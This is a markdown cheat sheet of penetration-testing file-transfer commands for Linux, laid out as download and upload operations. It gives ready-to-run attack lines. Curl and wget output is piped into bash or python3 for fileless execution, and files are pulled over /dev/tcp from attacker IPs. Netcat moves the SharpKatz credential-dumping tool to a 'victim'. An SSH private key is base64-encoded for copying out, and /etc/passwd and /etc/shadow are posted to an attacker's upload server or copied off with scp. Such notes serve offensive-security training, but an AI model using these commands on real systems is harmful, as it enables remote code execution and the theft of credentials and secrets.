# Content
- [Download Operations](#download-operations)
  - [Base64 Encoding / Decoding](#1-base64-encoding--decoding)
  - [Web Downloads](#2-web-downloads)
  - [SSH Downloads](#3-ssh-downloads)
- [Upload Operations](#upload-operations)
  - [Web Upload](#web-upload)
  - [Alternative Web File Transfer Method](#alternative-web-file-transfer-method)
  - [SCP Upload](#scp-upload)

# Download Operations

## 1) Base64 Encoding / Decoding
- encode
```bash
$ cat id_rsa |base64 -w 0;echo
```
- paste
```bash
$ echo -n '<base64>' | base64 -d > id_rsa
```

## 2) Web Downloads 

### with Wget and cURL
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Attacks Using Linux
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

**Note:** Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

### Download with Bash (/dev/tcp)
There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.


```bash
$ exec 3<>/dev/tcp/10.10.10.32/80

$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

$ cat <&3
```

## 3) SSH Downloads
- start ssh
```
sudo systemctl start ssh
```
- connect to it
```
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

## 4) nc tools
- **attacker**
```
## attacker lestin
sudo nc -l -p 443 -q 0 < SharpKatz.exe
sudo ncat -l -p 443 --send-only < SharpKatz.exe
## victim connect
sudo ncat -l -p 443 --send-only < SharpKatz.exe
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

## OR vicitm lestin
nc -l -p 8000 > SharpKatz.exe
ncat -l -p 8000 --recv-only > SharpKatz.exe
## attacker send
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

```

# Upload Operations

## Web Upload

- upload server
```
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```
- get to it
```
$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Alternative Web File Transfer Method
- create web server
```
python3 -m http.server

python2.7 -m SimpleHTTPServer

php -S 0.0.0.0:8000

ruby -run -ehttpd . -p8000
```
- get from it 
```
wget 192.168.49.128:8000/filetotransfer.txt
```

## SCP Upload

```
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```
